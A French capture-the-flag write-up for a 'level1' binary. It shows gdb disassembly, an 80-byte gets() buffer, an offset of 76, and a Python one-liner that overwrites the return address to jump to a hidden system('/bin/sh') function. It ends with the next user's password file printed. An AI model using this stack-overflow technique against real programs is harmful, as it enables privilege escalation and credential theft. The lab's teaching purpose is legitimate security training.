

# level1


## description
- Il y a un exécutable **level1**.Lorsqu'on l'exécute, il prends des caractères sur **stdin** jusqu'à ce qu'on appuie sur **ENTREE**.

## Résolution


Avec gdb, on peut voir l'utilisation de gets qui est sensible au **buffer overflow.**

    Dump of assembler code for function main:
           0x08048480 <+0>:     push   %ebp
           0x08048481 <+1>:     mov    %esp,%ebp
           0x08048483 <+3>:     and    $0xfffffff0,%esp
           0x08048486 <+6>:     sub    $0x50,%esp
           0x08048489 <+9>:     lea    0x10(%esp),%eax
           0x0804848d <+13>:    mov    %eax,(%esp)
           0x08048490 <+16>:    call   0x8048340 <gets@plt>
           0x08048495 <+21>:    leave
           0x08048496 <+22>:    ret
        End of assembler dump.

Dans la ligne suivante, il y a un buffer de taille 80(0x50 = 80)

     0x08048486 <+6>:     sub    $0x50,%esp

Avec les informations actuelle, il n'y a aucun moyen d'ouvrir un shell.

En utilisant la commande **info function**.
On peut voir qu'il y a une fonction run qui n'est pas appelée dans le main.

    All defined functions:
    Non-debugging symbols:
    [...]
    0x08048444  run
    [...]
On désassemble la fonction run.

       0x08048444 <+0>:     push   %ebp
       0x08048445 <+1>:     mov    %esp,%ebp
       0x08048447 <+3>:     sub    $0x18,%esp
       0x0804844a <+6>:     mov    0x80497c0,%eax
       0x0804844f <+11>:    mov    %eax,%edx
       0x08048451 <+13>:    mov    $0x8048570,%eax
       0x08048456 <+18>:    mov    %edx,0xc(%esp)
       0x0804845a <+22>:    movl   $0x13,0x8(%esp)
       0x08048462 <+30>:    movl   $0x1,0x4(%esp)
       0x0804846a <+38>:    mov    %eax,(%esp)
       0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
       0x08048472 <+46>:    movl   $0x8048584,(%esp)
       0x08048479 <+53>:    call   0x8048360 <system@plt>
       0x0804847e <+58>:    leave
       0x0804847f <+59>:    ret

Il y a system qui est appelé avec **"/bin/sh"** en argument. 
**0x8048584** contient **"/bin/sh"**

       0x08048472 <+46>:    movl   $0x8048584,(%esp)
       0x08048479 <+53>:    call   0x8048360 <system@plt>

L'objectif est de remplacer l'adresse du registre **eip** par l'adresse de la fonction run grâce a un **buffer overflow**.
Grace  a ce [site](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), on va pouvoir savoir a quel endroit on doit remplacer l'adresse :
notre chaine de caractère:

    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac

gdb affiche l'adresse du segfault

    Program received signal SIGSEGV, Segmentation fault.
    0x63413563 in ?? ()
le site indique offset 76. on va devoir ecrire 76 caractere avant l'adresse.

L'adresse de la fonction run est **0x08048444** mais on est en *little endian* donc on doit inverse l'adresse (**\x44\x84\x04\x08**).

On utilise python pour écrire 76 caractères avec l'adresse dans un fichier et on le transmet a cat.

    python -c 'print "A"*76+"\x44\x84\x04\x08"' > /tmp/run && cat /tmp/run - | ./level1

On est bien sur le user level2

    whoami
    level2
reste a afficher le fichier **.pass**.

    cat /home/user/level2/.pass
    53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
